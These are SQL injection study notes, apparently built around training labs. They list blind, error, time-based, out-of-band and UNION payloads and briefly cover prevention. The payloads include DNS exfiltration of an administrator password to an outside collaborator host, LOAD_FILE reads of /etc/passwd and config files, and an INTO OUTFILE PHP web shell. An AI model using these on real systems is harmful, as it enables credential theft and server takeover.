# SQL Injection

- SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
- Find endpoints for an application where it is likely to interact with DB server such as login, register, forgot password, add record, etc.


## Blind SQL injection

- It occurs when HTTP response of vulnerable request do not contain details of any database errors.
- Attacks of UNION are ineffective as they rely on result of query passed.

Types

![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/4b7cde45-8ee0-4712-b052-607c092252dc)


1. Conditional responses (TRUE / FALSE):
    - You can retrieve information by triggering different responses conditionally, depending on an injected condition.
        ![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/6ca4ec03-3f3a-4f9c-a79a-fc92b4e46167)
         
         `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` -->
         This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is `a`.
  
  - List of payloads
    - To check vulnerable or not
        > TrackingId=xyz' AND '1'='1

    - To check if table name exists
        > TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

    - To check particular username exist in table
        > TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

    - To check length of password (Increase value of `1` with each iteration)
        > TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

    - To check password character wise (Increase value of `1` first one with each iteration)
        > TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

2. Error-based SQL Injection
  - Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts
  - When injecting different boolean conditions makes no difference to the application's responses.
  - Modify the query so that it causes a database error only if the condition is true.
  - Purpose cause error, so if condition is false it will return error for e.g. Divide by zero
  - Payload
      > xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

    ![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/72b6a743-553b-4ff2-bbe8-52f233a2fcc1)

    - Link: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based#

4. Time-based SQL Injection
    - It is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false.

   - Payload
       > '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

    - The application takes 10 seconds to respond
       > TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

    - The application responds immediately with no time delay
       > TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

5. Out-of-band (OAST) SQLi
    - The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.
    - Exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control.
    - A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service)
  
    - Payload combine with XXE --> Will cause DNS lookuo to Burp Collaborator
       > TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

    - Payload --> input reads the password for the Administrator user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:
      > '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
      ![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/db8f381c-eff8-4fe6-976a-09009f2c430b)

    - Payload for finding password of administrator --> it will be appended as subdomain of burp collaborator
      > TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

## SQL injection in different contexts

- Test other formats for SQLi like JSON or XML.
- Bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:
  > &#x53;ELECT * FROM information_schema.tables

## Second-order SQL injection

- First-order SQL injection occurs when application processes user input from HTTP request and injects the input into SQL query in an unsafe way.
- Second-order SQL injection occurs when application does not process input from HTTP request immediately rather it stores if for future use. Later, when retreving the stored data it processes and inject input into SQL query in an unsafe way.

## Prevention

1. Parameterized queries / prepared statements.
       - Normally, when SQL program arrives at the SQL server, the server will parse, compile and optimize it. Finally, the server will execute the program and return results of execution
   ![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/bb7f26c4-4cf3-4b53-8da1-d11903948b27)

    - Prepared Statement work by making sure that user supplied data does not alter you SQL query's logic. These SQL statements are sent to and compiled by the SQL server before any user supplied parameters into the query. User input is added to statement right before execution. Anything that wasn't in the original statement will be treated as string data, not the executable SQL code.
      ![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/d06ebb70-3ebf-4965-8ae8-b239007de2b7)

2. Input Sanitization.

3. Input Validation. 

4. Use least previeleged user principle

5. Use WAF


## Methodology for UNION Based Attacks

1. Try to find if parameter is vulnerable to SQLi
   > Try adding ' or ''.

2. Find number of columns present in table (As for UNION operation, two SELECT statement should have same number of columns)
   > Use `' order by 1--` clause
   > Can use `NULL` 

3. Find which column's values are getting printed on screen.
   > Try `@@version` at different columns to check.

4. Find list of databases present
   > schema_name contains name of databases in INFORMATION_SCHEMA database and SCHEMATA table
   > cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

5. Find which database we are currently in.
   > database()
   > cn' UNION select 1,database(),2,3-- -


6. Find list of tables in particular databases
   > cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
   > TABLE_SCHEMA column points to the database each table belongs to.

7. Find list of columns in particular table.
   > cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
   > TABLE_NAME point to table name.

8. Dump all values of coulmn of table
   > cn' UNION select 1, username, password, 4 from dev.credentials-- -


## Methodology to read file

1. Find which user we are
   > select user()

2. Command to load file
   > SELECT LOAD_FILE('/etc/passwd');
   > cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

3.  Load any file
   > cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -

4. `view source` code for entire PHP code.

## Methodology to write into file

1. SELECT * from users INTO OUTFILE '/tmp/credentials';

2. SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

3. select 'file written successfully!' into outfile '/var/www/html/proof.txt'

4. cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

5. Shell --> cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

## SQLMAP


